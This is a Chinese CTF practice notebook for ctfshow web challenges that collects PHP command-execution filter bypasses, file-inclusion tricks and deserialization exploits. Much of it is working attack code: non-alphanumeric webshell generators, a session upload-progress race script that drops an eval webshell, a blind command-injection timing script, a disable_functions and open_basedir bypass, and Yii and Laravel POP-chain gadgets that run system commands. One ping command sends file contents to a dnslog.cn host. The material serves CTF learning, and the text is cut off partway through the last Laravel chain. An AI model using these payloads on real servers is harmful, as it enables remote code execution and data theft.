# CTFSHOW刷题记录

前记：刷题使我快乐

php 动态调式配置

```
[Xdebug]
zend_extension=D:/software/phpstudy_pro/Extensions/php/php7.4.3nts/ext/php_xdebug.dll
xdebug.remote_enable=On
xdebug.remote_host=localhost
xdebug.remote_port=9568{记得改}php7.4 {9564} php5
xdebug.remote_handler=dbgp
xdebug.remote_autostart=On
```

## (一)、信息搜集(1-20)

### 1. 源代码泄露

 (1). 右键直接查看

 (2).  view-source:或者直接抓包

### 2. 响应头有提示信息

### 3. 敏感文件泄露

```
1.robots.txt
2.index.phps
3.www.zip
4.git泄露
5.svn
6.swp
7.cookie
```

域名有时候也会有特俗的信息可用，域名信息查询网站 https://zijian.aliyun.com/  TXT 记录，一般指为某个主机名或域名设置的说明。

### 4. jsfinder的使用

在目录扫描的时候可以加上爬虫抓取，获取有用信息。

### 5. qq邮箱的信息收集

### 6. 查看ip

```
ping ctfshow.com
```

### 7.js问题

本地直接过js调试即可

### 8.asp程序中的数据库文件

```
wc.db
/db/db.mdb
```

### 9. git泄露



## (二)、爆破

### 1. tomcat 认证爆破

参考链接：https://www.cnblogs.com/007NBqaq/p/13220297.html



提供了可编码的爆破方式，并且可以拼接。

### 2. 子域名爆破

推荐在线爆破，网站自己百度即可

### 3. date爆破

![image-20210424110905253](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210424110905253.png)

不多解释

## (三)、命令执行

常用查看函数

```
more:一页一页的显示档案内容
less:与 more 类似 head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是
cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看 file -f:报错出具体内容 
1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行grep
```

### 1. 通配符的使用

```
*
？
```

### 2. GET POST传参绕过

### 3.寻找代替函数

#### 0x01 命令执行

```
passthru
system
show_source
```

#### 0x02 查看当前目录下文件

```
$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
```

glob协议甚至还可以绕过路劲限制

```
$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "
"; };
```

```
print_r(scandir(dirname(__FILE__)));
print_r(next(array_reverse(scandir(dirname(__FILE__)))));
c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));
```

```
opendir $a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "
"; };
```

//这里做一个解释`file — 把整个文件读入一个数组中`

fread()
fgets()
fgetc()
fgetss()
fgetcsv()
fpassthru()

`tee`最基本的用法就是显示输出结果并且保存内容到文件中。

**高亮返回**

```
show_source("flag.php");
highlight_file("flag.php");
```

### 4.反引号的命令执行

```
echo `nl fl''ag.php`;引号隔断法
show_source(next(array_reverse(scandir(pos(localeconv())))));
```

### 5 无参数rce

### 6. 过滤了分号

```
小知识：include不用括号，分号可以用?>代替。
include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

### 7. 进制编码

```
"x73x79x73x74x65x6d"("nl%09fl[a]*");
```

### 8. 文件包含rce

include用data伪协议

![image-20210425160752761](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210425160752761.png)

data://text/plain,`<?php phpinfo();?>//data://text/plain, 这样就相当于执行了php语句`
data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=

在字符串或变量中，这一串就相当于指定数据类型。

就是说 如果我直接去匹配里面的值的时候，他不会不被当成base64.

### 9.session

```
session_id(session_start())
```

session_id可以获取当前的PHPSESSID.

### 10. 异或绕过

```
<?php
$myfile = fopen("rce_or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
    }
  
        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)|urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
            $contents=$contents.$c." ".$a." ".$b."\n";
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

配合脚本

```
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
os.system("php rce_or.php")  #没有将php写入环境变量需手动运行
if(len(argv)!=2):
   print("="*50)
   print('USER：python exp.py <url>')
   print("eg：  python exp.py http://ctf.show/")
   print("="*50)
   exit(0)
url=argv[1]
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("rce_or.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))
   data={
       'c':urllib.parse.unquote(param)
       }
   r=requests.post(url,data=data)
   print("\n[*] result:\n"+r.text)

```

### 11. 空格绕过

```
%09 %0a
$IFS$9
%26
可以重定向字符来使用
${IFS}
$IFS$9
```

### 13. 关键字绕过

```
\
''
```

### 14. 无字母数字getshell

https://www.cnblogs.com/v01cano/p/11736722.html

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html

贴个异或脚本(可以实现根据题目正则来生成payload)

```
import re

content = ''
preg = '[a-z]|[0-9]' # 题目过滤正则
# 生成字典
for i in range(256):
    for j in range(256):
        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
            k = i | j
            if 32 <= k <= 126:
                a = '%' + hex(i)[2:].zfill(2)
                b = '%' + hex(j)[2:].zfill(2)
                content += (chr(k) + ' ' + a + ' ' + b + '\n')
f = open('rce_or.txt', 'w')
f.write(content)
while True:
payload1 = ''
payload2 = ''
code = input("data:")
for i in code:
    f = open('rce_or.txt')
    lines = f.readlines()
    for line in lines:
        if i == line[0]:
            payload1 = payload1 + line[2:5]
            payload2 = payload2 + line[6:9]
            break
payload = '("'+payload1+'"|"'+payload2+'")'
print("payload: "+ payload)
```

异或脚本（php版本）

```
<?php
$shell = "assert";
$result1 = "";
$result2 = "";
for($num=0;$num<=strlen($shell);$num++)
{
    for($x=33;$x<=126;$x++)
    {
        if(judge(chr($x)))
        {
            for($y=33;$y<=126;$y++)
            {
                if(judge(chr($y)))
                {
                    $f = chr($x)^chr($y);
                    if($f == $shell[$num])
                    {
                        $result1 .= chr($x);
                        $result2 .= chr($y);
                        break 2;
                    }
                }
            }
        }
    }
}
echo $result1;
echo "<br>";
echo $result2;

function judge($c)
{
    if(!preg_match('/[a-z0-9]/is',$c))
    {
        return true;
    }
    return false;
}
```

核心：**将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字**

自增运算

```
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;
$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

python脚本

```
r = input()
payload ="<?php $_=[].[];$__=0;$__++;$__++;$__++;$_=$_[$__];"   # 弄出来$_='a'
print(payload,end='')

table = {}

for i in range(0, 26):   # 0后面几个_就代表哪个字母
	# table[chr(ord('a')+i)] = "$__=$_;"+"++$__;"*i+"$_0"+"_"*i+"=$__;"
	table[chr(ord('a')+i)] = "$_0"+'_'*i+'=$_++;'
	print(table[chr(ord('a')+i)],end='')
a = ''	
_r = set(r)
for i in _r:
	a += table[i]
# print(a, end='')

b = '?><?='
for i in r:
	b += "$_0"+"_"*(ord(i)-ord('a'))
	b += '.'

b = b[:-1]+';'
print(b,end='')
```

取反，这个要自己一个一个尝试了。

全部脚本

https://blog.csdn.net/miuzzx/article/details/109143413

#### 0x01 通配符还在

post请求

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://961d3840-0a2d-4cbb-b0c9-7d07d4e787e2.challenge.ctf.show:8080/" method="post" enctype="multipart/form-data">

    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

![image-20210425180330281](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210425180330281.png)

```
import requests

while True:

url = "http://b3f572c8-7b58-4bc2-9d6b-c534fd31d357.challenge.ctf.show:8080/?c=.+/???/????????[@-[]"
r = requests.post(url, files={"file": ('1.php', b'cat flag.php')})
if r.text.find("flag") >0:
    print(r.text)
    break
```

#### 0x02 通配符已经没有

shell中各种黑魔法：https://blog.csdn.net/qq_46091464/article/details/108563368

```
${_}='' 返回上次命令执行结果
$((${_})) 返回0
${##} 返回1
$# 返回参数个数
$? 上一条命令的返回值
${#abc} 返回后面的参数个数3

```

### 15 单过滤字母或者数字

寻找 特殊的命令 有字符但没有数字的 有数字但没有字母的

```
?c=/bin/base64 flag.php(flag.php全靠猜)
?c=/bin/bzip2 flag.php
?c=/???/????2 ????.???
```

### 16 绕过ob_get_contents

`死亡exit（）`

### 17 绕过disable_function

详情见pentest武器库

#### php7.4 FFI扩展

```
c=?><?php $ffi = FFI::cdef("int system(const char *command);");$ffi->system("/readflag > a.yxy");exit();
```

无回显

### 18 mysql数据库读文件

```
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
>getMessage();exit(0);}exit(0);
```

### 19 linux内置命令

#### 常用内置变量：https://blog.51cto.com/allenh/1695810

```
${PATH:14:1}${PATH:5:1} ????.??? nl flag.php
${PATH:~1}  == ${PATH:~a}
在linux中可以用~获取变量的最后几位
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.??? ./base64 flag.php
${PWD::$?}???${PWD::$?}?????${#RANDOM} ????.???
```

### 20 命令执行盲注

```
截取字符串可以用awk等命令
判断命令执行结果可以用shell编程的if语句和sleep()函数
awk逐行获取
cut命令截取单独的字符
shell编程,if语句控制输出,sleep控制相应时间
```

主要解决的两个问题

```
1.代码格式
2.字符串的切割
```

贴个脚本

```
import requests
cmd = 'cat /f149_15_h3r3'
result = ''
for i in range(1, 10):
	for j in range(1, 50):
	    print('i=', i, ' j=', j)
	    for k in range(32, 128):
	        k = chr(k)
	        payload = f"if [ `{cmd} |awk NR=={i}|cut -c {j}` == {k} ]; then sleep 3;fi"
	        #paylod 
	        payload = '?c=' + payload
	        url = 'http://09e725aa-b1ad-4a59-86ca-79f9409cc11c.challenge.ctf.show:8080'
	        try:
	            requests.get(url + payload, timeout=(2.5, 2.5))
	        except:
	            result = result + k
	            print(result)
	            break
result = result + "\n"
```

## (四)、文件包含

### 1. php伪协议

```
php://fileter
data://
data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=
```

### 2. 包含日志文件

```
/var/log/nginx/access.log
/etc/httpd/logs/access_log
/var/log/httpd/access_log
```

可以先看看配置文件

```
/etc/httpd/conf/httpd.conf
/etc/init.d/httpd
```

### 3. session.upload_progress 文件包含

这个可以看CTFer从0到1这本书，这其实是一个很正常的考点，但是真难想起来，好久没碰到了

利用脚本

```
#coding=utf-8 
import io
import requests
import threading
import sys
sessid = 'demo'
data = {"cmd":"system('id');"} 
url = "http://9859200e-75ef-4e52-9ee0-681945d01583.challenge.ctf.show:8080/"
def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( url, data={'PHP_SESSION_UPLOAD_PROGRESS': "<?php eval($_POST['cmd']);fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');echo md5('1');?>"}, files={'file': ('demo.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post(url+'?file=/tmp/sess_'+sessid,data=data)
        if 'peri0d.txt' in resp.text:
        	print("[-]"+"*"*20+"success")
            print(resp.text)
            event.clear()
            sys.exit(0)
        else:
        	print("[-]"+"*"*20+"try again"*20)
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30): 
            threading.Thread(target=write,args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()
    

```

![image-20210426222517090](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210426222517090.png)

虽然session_destroy,但是在每个php请求开始的时候，都会重新创建一个。

![image-20210426224909609](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210426224909609.png)

![image-20210426224922913](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210426224922913.png)

![image-20210426224930519](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210426224930519.png)

bug解析：https://www.freebuf.com/vuls/202819.html

#### 4. php://filter绕过死亡exit

```
php://filter/write=convert.base64-decode/resource=1.php
content=aaPD9waHAgZXZhbCgkX1BPU1RbMF0pOz8%2B
密码0
```

```
https://www.leavesongs.com/PENETRATION/php-filter-magic.html 
https://xz.aliyun.com/t/8163#toc-3
```

至尊好文:https://xz.aliyun.com/t/8163#toc-3

iconv支持的编码格式：http://www.gnu.org/software/libiconv/

编码转换函数：`base_convert`

常用的编码转换：

```
usc-2两位一转换：php://filter/convert.iconv.UCS-2LE.UCS-2BE|?<hp pe@av(l_$OPTSs[m1lp]e;)>?/resource=s1mple.php
使用该编码时 记得在本地做好测试， 两位一调整会和字符长度有关
usc-4四位已转换：同上
```



#### 0x01 base64和rot13 编码绕过

**base64编码后的等号，表示的是编码的结束，所以等号后面不能有字符**

```
$filename='php://filter/convert.base64-decode/resource=s1mple.php';
$content = 'aPD9waHAgcGhwaW5mbygpOz8+';
```

![image-20210427010152321](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210427010152321.png)

#### 0x02 **.htaccess的预包含利用**

```
$filename=php://filter/write=string.strip_tags/resource=.htaccess
$content=?>php_value%20auto_prepend_file%20G:\s1mple.php
```

其实这里也使用了php的过滤器，其中的strip_tags可以消除文件里面的标签。然后在闭合一下`>`,前面的`?>`是可以删除的

string.strip_tags过滤器只是可以在php5的环境下顺利的使用， 从字符串中去除 HTML 和 PHP 标记

#### 0x03 zlib.deflate绕过

```
$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php
$content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0dphpinfo();?>/resource=s1mple.php
```

### 5. php://filter中许许多多的过滤器

https://www.php.net/manual/zh/filters.php

### 6. 绕过require_once的限制

推荐链接：https://www.anquanke.com/post/id/213235

once原理：

```
php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once('flag.php')，已经include的文件不可以再require_once。
```

通过符号链接进行多层迭代。

### 7. LFI本地文件包含

### 8. php7 Segment Fault

php7 使用特殊的会留下来

```
import requests
from io import BytesIO
url="http://f325d633-efa0-4a8c-a61d-90fc70c9ea1d.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"
payload="<?php phpinfo();?>"
files={
    "file":BytesIO(payload.encode())
}
r=requests.post(url=url,files=files,allow_redirects=False)

print(r.text)

```



## (五)、php特性

### 1. 散列函数绕过

#### 0x01 指针绕过

使用场景: php反序列化中的`R`参数

#### 0x02 数组绕过

#### 0x03 强碰撞

https://blog.csdn.net/qq_19980431/article/details/83018232

### 2. preg_match绕过

#### 0x01 多行绕过

#### 0x02 00截断

### 3.intval绕过

#### 0x01 正常解析

intval()函数如果$base为0则$var中存在字母的话遇到字母就**停止读取** 

并且该情况下，会解析**0x**,直接的num。

但是e这个字母比较特殊，可以在PHP中不是科学计数法。

所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以





这样其实这俩个就相当于同一种情况了。`==`读会自动转换一下。

#### 0x02 进制转换

```
 0b?? : 二进制
 0??? : 八进制
 0X?? : 16进制
```

#### 0x03 浮点数转整数

```
4726.0==4726
```

#### 0x04 正负数

```
+1 == 1
```

### 4. 文件名绕过

#### 0x01 filter绕过

##### 0x02 ./ 当前目录绕过

### 5. open_basedir绕过

可以绕过进行读文件

```<?php
<?php
chdir("sandbox/660bef445e619cf44695fec04f93e4f7ff60e252");
mkdir('decadefirst');
chdir('decadefirst');
ini_set('open_basedir','..');
chdir('..');chdir('..');chdir('..');
chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir','/');
var_dump(file_get_contents("/flag"));
```

可以绕过看目录

```
<?php
$a = new DirectoryIterator("glob:///*");
foreach($a as $f){
    echo($f->__toString().'<br>');
}
```

### 7. 打印类的属性

```
https://segmentfault.com/q/1010000000770535
```

已知函数:http://php.net/manual/zh/function.get-object-vars.php
http://php.net/manual/zh/function.get-class-methods.php
http://php.net/manual/zh/function.get-class-vars.php

也可以使用已有的内置函数

```
可以使用 ReflectionClass 类,打印出类的结构。
```

### 8. is_numeric绕过

#### 0x01 16进制

```
在php5的环境中，是可以识别十六进制的，也就是说，如果传入v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e(<?php eval($_POST[1]);?>的十六进制)也是可以识别为数字的。
var_dump(is_numeric("0x3c3f706870206576616c28245f504f53545b315d293b3f3e"));
下返回true
题目经过substr($v2,2)得到0x后面的十六进制3c3f706870206576616c28245f504f53545b315d293b3f3e，因为hex2bin如果参数带0x会报错。
```

#### 0x02代码base64编码后再转为十六进制为全数字

```
$a='<?=cat *;';
$b=base64_encode($a); // PD89YGNhdCAqYDs=
$c=bin2hex($b); //等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着=的base64解码出来的内容是相同的。
```

```
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-
decode/resource=2.php
POST
v1=hex2bin
```

### 9 ereg函数过滤

```
ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配
```

在php中常用的指定模式搜索，正则表达式中更加常用，所以我们在使用模式的时候，使用`%00`截断更加重要了，还有就是`%0a`%`26``%09`.

### 10 异常处理函数巧用绕过

```
?v1=Exception&v2=system('cat fl36dg.txt') ?v1=Reflectionclass&v2=system('cat fl36dg.txt')
返回 ReflectionClass 对象字符串的表示形式。
ReflectionMethod 
返回类的注释
```

### 11 奇怪的获取目录文件方法

```
?v1=FilesystemIterator&v2=getcwd
```

https://www.php.net/manual/zh/class.filesystemiterator.php

这个内置类好用，good。

```
1-eE.xX
```



### 12 超全局变量

`通过利用超全局变量将所有可用的变量都打印出来`

### 14 php伪协议

```
php://filter/resource=flag.php
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
compress.zlib://flag.php
```

### 15 软链接绕过文件包含限制

```
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

### 16  遇事不决就找所有的字符串

```
function filter($num){

$num=str_replace("0x","1",$num);
$num=str_replace("0","1",$num);
$num=str_replace(".","1",$num);
$num=str_replace("e","1",$num);
$num=str_replace("+","1",$num);
return $num;
}
for ($i=0; $i <=128 ; $i++) {

$num=chr($i).'36';
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36')){

    echo urlencode(chr($i))."\n";
}
}
```

绕过数字

### 17 php中的变量名

PHP变量名应该只有`数字字母下划线`,同时GET或POST方式传进去的变量名,会自动将`空格` `+ . [`转换为`_`
但是有一个特性可以绕过,使变量名出现`.`之类的。特殊字符`[,` GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了

### 18 扩展中的奇怪函数

#### 0x01 php_gettext.dll

https://www.php.net/manual/zh/book.gettext.php

```
_ 是gettext函数的简写
echo _("你好");
会输出你好
```

#### 0x02 查看已经定义的变量

```
get_defined_vars
globals
```

### 19 正则表达式的攻击方法

#### 0x01 \e的命令执行

https://www.cesafe.com/html/6999.html

#### 0x02 换行绕过

#### 0x03 溢出绕过

### 20 逻辑运算符的运用

```
对于“与”（&&） 运算： x && y 当x为false时，直接跳过，不执行y；
对于“或”（||） 运算 ：   x||y 当x为true时，直接跳过，不执行y。
```

### 21 套娃命令执行

![image-20210501233737118](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210501233737118.png)

虚假的命令执行。

```
?F=$F;+ping cat flag.php|awk 'NR==2'.6x1sys.dnslog.cn
```

```
`$F`;+ping `cat flag.php|awk 'NR==2'`.6d8ydj.dnslog.cn
```

### 22 call_user_func

```
https://www.php.net/manual/zh/function.call-user-func.php
```

### 23 弱类型

https://www.cnblogs.com/Mrsm1th/p/6745532.html

**一个数值和字符串进行比较的时候，会将字符串转换成数值**

### 24 绕过return

先看比如构造出来system("whoami")怎么执行它

1system("whoami"); error不会执行
1+system("whoami"); Warning 会执行

这里的说明就是前面的加个符号虽然会有警告但是依然会执行。

### 25 create_function函数的解析

但要注意在php中的命名空间这一个比较坑的点，我们必须得抓住机会。`\`

https://www.cnblogs.com/zzjdbk/p/12980483.html

经典留后门。

### 26 php中奇怪的中文变量名

绕过字母数字过滤。

```
payload：
$哈="`{{{"^"?<>/";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f*
其中"`{{{" ^ "?<>/"异或得到_GET
$哈=_GET;
$_GET[哼]($_GET[嗯]);
?哼=system&嗯=tac f*
```

### 28 __autoload特殊属性

```
这个题一点点小坑__autoload()函数不是类里面的
__autoload — 尝试加载未定义的类
最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦
原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用
__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo
接下来就去getshell啦
```

We you create an object of the class and If the PHP engine doesn't find the class file included in the script then __autoload() magic method will automatically trigger.

## (六)、 反序列化

### 1 `/[oc]:\d+:/i`绕过

对于o后面的数字进行删除的绕过，加上一个加号即可。

### 2 soap反序列化+ssrf+crlf

```
<?php
$target = 'http://123.206.216.198/bbb.php';
$post_string = 'a=b&flag=aaa';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: xxxx=1234'
    );
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^','%0d%0a',$aaa);
$aaa = str_replace('&','%26',$aaa);
echo $aaa;
?>

```

### 3 内部类反序列化

#### 0x01 ssrf

#### 0x02 xss

#### 0x03 任意文件删除

```
可调用任意类的时候找__construct的时候一些可用的类：
案例：pornhub某漏洞
可获取目录
DirectoryIterator

XXE
SimpleXMLElement

创建空白文件
SQLite3
```

https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_0

### 4 常见的特殊的魔术方法

```
__construct new时候会被执行
__wakeup 反序列化时会被执行
__invoke 被调用时执行 乐死与 class()
__sleep serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。
```

__unserialize 如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。

特殊魔术方法：https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize

### 5 session反序列化

参考链接：https://blog.csdn.net/qq_43431158/article/details/99544797

### 6 R参数传地址（强相等）

### 7 php常识大小写

`php常识 —–> PHP大小写：函数名和类名不区分,变量名区分`

### 8 常见矿建的反序列化漏洞

```
这个点要自己百度搜索了
```

记载yii的框架一个

```
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'dir';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>

```

```
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', 'cp /f* bit.txt');
    echo(base64_encode(serialize($exp)));
}
```

```
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['isRunning'] = [new CreateAction(), 'run'];
        }
    }
}

// poc2
namespace Codeception\Extension{
    use Faker\Generator;
    class RunProcess{
        private $processes;
        public function __construct()
        {
            $this->processes = [new Generator()];
        }
    }
}
namespace{
    // 生成poc
    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
}
?>

```

laravel5.7反序列化漏洞

```
<?php
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $command;
        protected $parameters;
        protected $app;
        public $test;

        public function __construct($command, $parameters,$class,$app)
        {
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test=$class;
            $this->app=$app;
        }
    }
}

namespace Illuminate\Auth{
    class GenericUser{
        protected $attributes;
        public function __construct(array $attributes){
            $this->attributes = $attributes;
        }
    }
}


namespace Illuminate\Foundation{
    class Application{
        protected $hasBeenBootstrapped = false;
        protected $bindings;

        public function __construct($bind){
            $this->bindings=$bind;
        }
    }
}

namespace{
    echo urlencode(serialize(new Illuminate\Foundation\Testing\PendingCommand("system",array('cat /flag'),new Illuminate\Auth\GenericUser(array("expectedOutput"=>array("0"=>"1"),"expectedQuestions"=>array("0"=>"1"))),new Illuminate\Foundation\Application(array("Illuminate\Contracts\Console\Kernel"=>array("concrete"=>"Illuminate\Foundation\Application"))))));
}
?>
```

laravel5.8反序列化漏洞

```
<?php
namespace PhpParser\Node\Scalar\MagicConst{
    class Line {}
}
namespace Mockery\Generator{
    class MockDefinition
    {
        protected $config;
        protected $code;

        public function __construct($config, $code)
        {
            $this->config = $config;
            $this->code = $code;
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader{}
}
namespace Illuminate\Bus{
    class Dispatcher
    {
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}
namespace Illuminate\Foundation\Console{
    class QueuedCommand
    {
        public $connection;
        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}
namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}
namespace{
    $line = new PhpParser\Node\Scalar\MagicConst\Line();
    $mockdefinition = new Mockery\Generator\MockDefinition($line,"<?php system('cat /f*');exit;?>");
    $evalloader = new Mockery\Loader\EvalLoader();
    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,'load'));
    $queuedcommand = new Illuminate\Foundation\Console\QueuedCommand($mockdefinition);
